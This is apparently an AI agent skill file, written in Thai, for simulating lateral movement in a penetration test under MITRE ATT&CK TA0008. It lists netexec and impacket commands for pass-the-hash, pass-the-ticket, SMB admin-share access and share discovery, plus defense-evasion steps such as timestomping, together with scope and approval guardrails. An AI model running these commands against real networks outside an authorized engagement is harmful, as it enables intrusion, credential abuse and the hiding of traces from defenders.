---
name: lateral-movement
description: การจำลอง Lateral Movement ตาม MITRE ATT&CK TA0008 ด้วย impacket, netexec, Pass-the-Hash/Ticket เพื่อประเมิน Access Chain และ C-I-A Impact ตาม ISO 27001
---

# SKILL: lateral-movement

## Purpose
จำลองการเคลื่อนที่ระหว่าง host ภายในเครือข่ายหลังจาก initial foothold เพื่อประเมิน **Access Chain** ตาม **MITRE ATT&CK TA0008** วัดผลกระทบด้าน **ISO 27001 C-I-A Triad** อย่างปลอดภัย (PoC-only, ไม่ Exfiltrate ข้อมูลจริง)

## Focus Areas
- **Target:** Internal Hosts, AD Environment, Shared Resources
- **Frameworks:** MITRE ATT&CK TA0008 (Lateral Movement), ISO 27001 A.12 (Operations Security), OWASP Risk Rating
- **Tooling:** `netexec`, `crackmapexec`, `impacket` toolkit, `ssh`, `smbclient`

## Required Inputs
- `foothold_host`: Host ที่ได้ initial access แล้ว
- `credential_bundle`: Hash/Ticket/Password ที่ได้จาก rt-webops
- `scope_rules`: IP range ที่อนุญาต
- `timebox_minutes`: เพดานเวลา

## MITRE ATT&CK Techniques ที่ครอบคลุม

| T-Code | Technique | Command ตัวอย่าง |
|--------|-----------|-----------------|
| T1550.002 | Pass-the-Hash | `netexec smb $TARGET -u user -H <hash>` |
| T1550.003 | Pass-the-Ticket | `impacket-psexec -k -no-pass $TARGET` |
| T1021.002 | SMB/Admin Shares | `smbclient //$TARGET/C$ -U user` |
| T1021.004 | SSH | `ssh user@$TARGET` |
| T1077 | Windows Admin Shares | อ่าน/เขียน `\\TARGET\ADMIN$` |
| T1135 | Network Share Discovery | `netexec smb $SUBNET --shares` |

## Workflow

### Phase 1: Internal Discovery (MITRE T1018, T1135)
```bash
# ค้นหา hosts ใน subnet
netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# ดู shares
netexec smb $TARGET --shares -u $USER -p $PASS
```

### Phase 2: Pass-the-Hash (MITRE T1550.002)
```bash
# ทดสอบ Hash บน host อื่น
netexec smb $TARGET -u $USER -H $HASH --local-auth

# impacket wmiexec
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$HASH
```

### Phase 3: Pass-the-Ticket (MITRE T1550.003)
```bash
# Export TGT จาก Kerberoasting
impacket-getTGT $DOMAIN/$USER -hashes :$HASH
export KRB5CCNAME=user.ccache

# ใช้ ticket
impacket-psexec $TARGET -k -no-pass
```

### Phase 4: Defense Evasion (MITRE T1562, T1070)
- ใช้ LOLBins (cmd.exe, wmic, powershell ที่มีในระบบ)
- ทำ timestomping เพื่อซ่อนร่องรอย (PoC เท่านั้น)
- ตรวจสอบว่า EDR/AV ตรวจพบ techniques ไหนบ้าง

## Output Contract
- Access Chain: `foothold → pivot host → target` พร้อม T-Code แต่ละ step
- PoC Evidence: CLI output ที่แสดง access สำเร็จ (ไม่มีข้อมูลจริง)
- C-I-A Impact Assessment (ISO 27001)
- Detection Coverage: tools ตัวไหนที่ detect/ไม่ detect

## Safety Guardrails
- **PoC-only:** แสดงว่า access สำเร็จ ห้าม read/copy ข้อมูลจริง
- **Scope Strict:** ห้ามโจมตี host นอก `scope_rules` เด็ดขาด
- **Reversible Actions Only:** ห้ามลบ/แก้ไข config, files ของระบบ production
- **#approve Required:** ต้องรอ SecOps Lead อนุมัติก่อนทุก escalation
